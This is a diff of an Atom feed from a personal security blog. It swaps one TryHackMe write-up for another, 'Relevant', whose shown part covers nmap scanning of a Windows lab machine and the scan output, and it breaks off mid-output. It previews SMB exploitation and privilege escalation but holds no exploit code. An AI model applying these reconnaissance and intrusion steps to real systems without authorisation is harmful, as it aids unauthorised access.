@@ -1,4 +1,235 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-08T21:00:11-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">bynafrez08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin | AKA bynafrez</name></author><entry><title type="html">THM - Retro</title><link href="http://localhost:4000/thm-retro/" rel="alternate" type="text/html" title="THM - Retro" /><published>2022-08-08T00:00:00-04:00</published><updated>2022-08-08T00:00:00-04:00</updated><id>http://localhost:4000/thm-retro</id><content type="html" xml:base="http://localhost:4000/thm-retro/">&lt;p&gt;Retro is a windows machine with wordpress site hosted on the port 80, which contain some credentials that allow access on the admin panel and get a reverse shell on the target machine, and lastly we escalete privileges abusing the CVE-2019-1388.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-13T21:34:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">bynafrez08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin | AKA bynafrez</name></author><entry><title type="html">THM - Relevant</title><link href="http://localhost:4000/thm-relevant/" rel="alternate" type="text/html" title="THM - Relevant" /><published>2022-08-13T00:00:00-04:00</published><updated>2022-08-13T00:00:00-04:00</updated><id>http://localhost:4000/thm-relevant</id><content type="html" xml:base="http://localhost:4000/thm-relevant/">&lt;p&gt;Relevant is a windows machine that has enabled smb which will going to exploit this services to access on the machine, and for the privilege escalation we are going to exploit windows access tokens.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/portada.jpeg&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;First we will create a directory with the name of the machine, and with &lt;strong&gt;&lt;em&gt;mkt&lt;/em&gt;&lt;/strong&gt; i will create the following directories to be able to organize the files of each one of those directories.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/mkt.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;mkt is a function that i have defined in the &lt;strong&gt;&lt;em&gt;~/.zshrc&lt;/em&gt;&lt;/strong&gt; so that I can create these directories without creating them one by one.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkt () {
+        mkdir {nmap,content,exploits,scripts}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So if we send an icmp trace we can see that we have a connection form the target machine and through the TTL we know that is a windows machine, remember that the linux machine have 64 TTL and windows have 128 TTL and sometimes this values can decrease one digit and this because of traceroute.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/img-relevant/captura1.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;p&gt;Let’s scan the target machine with nmap using the following parameters:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Flags&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-sCV (-sC -sV)&lt;/td&gt;
+      &lt;td&gt;Use nmap recon scripts to discover the version and services that are running each of those ports.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-p&lt;/td&gt;
+      &lt;td&gt;specify the ports that we want to scan (i know what’s ports to scan because i do previous scan to know whats ports are open).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-oN&lt;/td&gt;
+      &lt;td&gt;Save the scan in nmap format.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;This is the scan result, we can see that there is a webserver on the port 80 and 49663 and smb on the port 445. The default nmap scripts reports us which version of windows is using the target machine using smb.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Nmap 7.92 scan initiated Tue Jul 12 16:17:45 2022 as: nmap -sCV -p80,135,139,445,3389,49663,49667,49669 -oN targeted 10.10.225.44
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Nmap&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10.225.44&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.046&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;latency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;STATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVICE&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;VERSION&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Potentially&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;risky&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRACE&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;msrpc&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RPC&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;netbios&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssn&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssn&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;445&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;microsoft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ds&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Standard&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Evaluation&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14393&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;microsoft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ds&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;3389&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wbt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Terminal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Services&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_ssl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Relevant&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valid&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;before&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valid&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2023&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntlm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Target_Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RELEVANT&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;NetBIOS_Domain_Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RELEVANT&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;NetBIOS_Computer_Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RELEVANT&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;DNS_Domain_Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Relevant&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;DNS_Computer_Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Relevant&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;Product_Version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.0.14393&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;System_Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;49663&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;10.0&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Potentially&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;risky&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRACE&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;49667&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;msrpc&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RPC&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;49669&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;msrpc&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RPC&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Service&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OSs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Windows&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2008&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2012&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cpe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;microsoft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;windows&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h24m01s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deviation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h07m50s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;median&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smb2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mf&quot;&gt;3.1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;but&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;required&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;account_used&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guest&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;authentication_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;challenge_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;supported&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;message_signing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disabled&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dangerous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;but&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smb2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
